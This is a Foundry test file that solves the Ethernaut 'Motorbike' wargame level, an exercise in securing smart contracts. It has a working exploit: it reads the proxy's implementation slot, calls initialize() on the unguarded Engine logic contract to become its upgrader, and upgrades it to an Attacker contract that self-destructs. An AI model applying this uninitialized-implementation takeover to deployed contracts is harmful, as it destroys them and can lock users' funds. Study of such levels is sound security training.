// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Motorbike.sol";
import "src/levels/MotorbikeFactory.sol";

contract TestMotorbike is BaseTest {
    Motorbike private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new MotorbikeFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance{value: 0.001 ether}(true));
        level = Motorbike(levelAddress);

        Motorbike local = level;

        uint256 size;
        assembly {
            size := extcodesize(local)
        }

        // Check that the contract is correctly setup
        assertGt(size, 0);
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player);

        // We have to make the Motorbike contract unusable by destroying Engine contract. There is no self destruct
        // function in engine contract and we can not modify the logic contract address in Motorbike contract as well

        // We can solve this challenge by calling initialize fn of Engine contract directly, when we call the fn of
        // logic contract directly, all the state updates are done in the context of the logic contract and not proxy,
        // when we call initialize fn direcly, we become the upgrader of the Engine contract and now we can call
        //the upgradeToAndCall fn of Engine Contract directly and destroy the engine

        bytes32 addr = vm.load(address(level), 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc);
        address logicContractAddress = address(uint256(addr));

        Engine engine = Engine(logicContractAddress);

        engine.initialize();

        Attacker attacker = new Attacker();

        // call selddestruct
        engine.upgradeToAndCall(address(attacker), abi.encodeWithSignature("attack()"));

        vm.stopPrank();
    }
}

contract Attacker {
    function attack() external {
        selfdestruct(payable(msg.sender));
    }
}
